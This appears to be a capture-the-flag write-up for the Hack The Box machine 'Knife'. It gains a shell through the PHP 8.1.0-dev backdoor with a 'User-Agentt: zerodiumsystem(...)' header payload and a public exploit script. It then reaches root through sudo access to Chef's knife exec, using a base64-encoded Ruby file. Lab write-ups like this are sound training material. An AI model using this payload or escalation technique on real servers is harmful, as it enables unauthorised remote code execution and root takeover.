# HTB Knife — Writeup
**OS:** Ubuntu 20.04
**Difficulty:** Easy
**Attack Vector:** PHP 8.1.0-dev Backdoor (User-Agentt RCE)
**Privesc:** Chef Knife SUID (sudo NOPASSWD)
**System:** Arch Linux

---

## Summary

Knife is an easy Linux machine running a backdoored version of PHP 8.1.0-dev. The backdoor allows remote code execution via a crafted `User-Agentt` header, providing a shell as `james`. Privilege escalation to root is achieved through `sudo /usr/bin/knife` (Chef's CLI tool), which can execute arbitrary Ruby code.

---

## Reconnaissance

### Port Scan
```bash
nmap -sV -sC -Pn 10.129.2.37
```

Key open ports:
- `22/tcp` — OpenSSH
- `80/tcp` — Apache with **PHP 8.1.0-dev**

### Version Discovery

```bash
curl -I http://10.129.2.37/
```

The response headers reveal `X-Powered-By: PHP/8.1.0-dev` — a version known to contain a supply-chain backdoor.

### Exploit Research

```bash
searchsploit "PHP 8.1.0-dev"
```

```
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution | php/webapps/49933.py
```

---

## Exploitation

### Step 1 — Initial Access via PHP Backdoor

The PHP 8.1.0-dev source was compromised in March 2021 with a backdoor that executes arbitrary commands sent in a `User-Agentt` header (note the double 't'). The backdoor triggers `system()` on the header value.

```bash
cp /usr/share/exploitdb/exploits/php/webapps/49933.py ~/
python3 49933.py
```

```
Enter the full host url:
http://10.129.2.37/

Interactive shell is opened on http://10.129.2.37/
Can't acces tty; job crontol turned off.
$ whoami
james
```

The exploit works by sending requests with:
```
User-Agentt: zerodiumsystem('<command>');
```

### Step 2 — User Flag

```bash
$ cat /home/james/user.txt
8a93c497fc69e16eee2f54e31e170bb9
```

### Step 3 — Privilege Escalation Enumeration

```bash
$ sudo -l
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

`/usr/bin/knife` is Chef's CLI tool — it has a `knife exec` subcommand that runs arbitrary Ruby code as whatever user invokes it. With `sudo NOPASSWD`, that means root.

### Step 4 — Root Flag via Knife exec

Direct Ruby execution via `knife exec -E '...'` failed — the PHP backdoor's `system('...')` wrapper clashes with single quotes in the command, breaking the syntax.

**Workaround — base64 encode the Ruby script to avoid all quote characters:**

```bash
$ echo cHV0cyBGaWxlLnJlYWQoIi9yb290L3Jvb3QudHh0Iik= | base64 -d > /tmp/x.rb
$ sudo /usr/bin/knife exec /tmp/x.rb
39282924bc11c875434286634d2c8267
```

The base64 decodes to `puts File.read("/root/root.txt")` — no quotes in the shell command itself.

---

## Flags

```
User: 8a93c497fc69e16eee2f54e31e170bb9
Root: 39282924bc11c875434286634d2c8267
```

---

## Arch Linux Gotchas & Lessons Learned

| Problem | Fix |
|---|---|
| PHP backdoor shell can't spawn interactive shells | `sudo knife exec -E 'exec "/bin/bash"'` fails — use `knife exec FILE` with a Ruby script instead |
| Single quotes break inside PHP `system()` wrapper | The backdoor runs `system('<input>')` — any single quotes in your command break the syntax |
| `knife exec -E 'puts \`cmd\`'` fails | Quote nesting between PHP's `system()`, shell, and Ruby is impossible — write a script file instead |
| `printf` with `\x22` for double quotes didn't work | Some shells interpret hex escapes differently — base64 encoding is the most reliable bypass |
| Exploit output includes HTML junk | The script splits on `<!DOCTYPE html>` — works but leaves some noise. Functional, not pretty |

---

## Key Takeaway — Quote Escaping in Chained Interpreters

The hardest part of this box wasn't finding the vulns — it was dealing with **nested quoting** across three layers:

1. **PHP** `system('...')` — wraps input in single quotes
2. **Shell** `/bin/sh -c '...'` — another layer of interpretation
3. **Ruby** `puts File.read("...")` — needs its own quotes

Base64 encoding sidesteps all of it by keeping the command quote-free until it's decoded on disk.

---

## Tools Used

- `nmap` — reconnaissance
- `curl` — version fingerprinting via response headers
- `searchsploit` — finding the PHP 8.1.0-dev exploit
- `49933.py` — PHP backdoor RCE pseudo-shell
- `knife exec` (Chef) — privilege escalation to root
- `base64` — bypassing quote escaping issues

---

*Four machines down. When quotes fight quotes, encode your way out.* 🏆
